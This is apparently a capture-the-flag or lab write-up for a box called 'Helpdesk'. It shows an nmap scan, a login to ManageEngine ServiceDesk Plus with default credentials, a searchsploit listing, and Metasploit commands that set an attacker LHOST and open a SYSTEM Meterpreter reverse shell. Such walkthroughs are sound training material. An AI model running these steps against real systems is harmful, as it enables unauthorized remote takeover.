# Helpdesk

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.43 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 14:37 +08
Nmap scan report for 192.168.201.43
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

RDP is available.

### ManageEngine RCE --> SYSTEM

Port 8080 hosts a really vulnerable looking software:

<figure><img src="../../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

Default creds of `administrator:administrator` works in logging us in:

<figure><img src="../../../.gitbook/assets/image (1955).png" alt=""><figcaption></figcaption></figure>

There are loads of vulnerabilities with this software.&#x20;

```
$ searchsploit manageengine servicedesk Plus  
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection     | jsp/webapps/11793.txt
ManageEngine ServiceDesk Plus 8.0 - Directory Traversal    | jsp/webapps/17437.txt
ManageEngine ServiceDesk Plus 8.0 - Multiple Persistent Cr | jsp/webapps/17713.txt
ManageEngine ServiceDesk Plus 8.0 Build 8013 - Multiple Cr | jsp/webapps/17586.txt
ManageEngine ServiceDesk Plus 8.0.0 Build 8013 - Improper  | multiple/webapps/17572.txt
ManageEngine ServiceDesk Plus 8.1 - Persistent Cross-Site  | windows/webapps/20356.py
ManageEngine ServiceDesk Plus 9.0 - Authentication Bypass  | java/webapps/42037.txt
ManageEngine ServiceDesk Plus 9.0 - SQL Injection          | jsp/webapps/35890.txt
ManageEngine ServiceDesk Plus 9.0 - User Enumeration       | jsp/webapps/35891.txt
ManageEngine ServiceDesk Plus 9.0 < Build 9031 - User Priv | jsp/webapps/35904.txt
ManageEngine ServiceDesk Plus 9.1 build 9110 - Directory T | jsp/webapps/38395.txt
ManageEngine ServiceDesk Plus 9.2 Build 9207 - Unauthorize | java/webapps/40569.txt
ManageEngine ServiceDesk Plus 9.3 - User Enumeration       | java/webapps/46674.txt
Zoho ManageEngine ServiceDesk Plus (SDP) < 10.0 build 1001 | jsp/webapps/46413.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'PurchaseRequest. | java/webapps/46966.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SearchN.do' Cros | java/webapps/46965.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SiteLookup.do' C | java/webapps/46963.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - 'SolutionSearch.d | java/webapps/46964.txt
Zoho ManageEngine ServiceDesk Plus 9.3 - Cross-Site Script | multiple/webapps/46895.txt
Zoho ManageEngine ServiceDesk Plus < 10.5 - Improper Acces | multiple/webapps/46894.txt
Zoho ManageEngine ServiceDesk Plus MSP 9.4 - User Enumerat | java/webapps/50027.py
----------------------------------------------------------- ---------------------------------
```

I was lazy, so I used `msfconsole` to exploit this easily.&#x20;

```
msf6 exploit(multi/http/manageengine_auth_upload) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > set PASSWORD administrator
PASSWORD => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > set LHOST tun0
LHOST => 192.168.45.191
msf6 exploit(multi/http/manageengine_auth_upload) > set RHOSTS 192.168.201.43
RHOSTS => 192.168.201.43
msf6 exploit(multi/http/manageengine_auth_upload) > exploit
```

This would give us a Meterpreter shell as the SYSTEM user:

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>
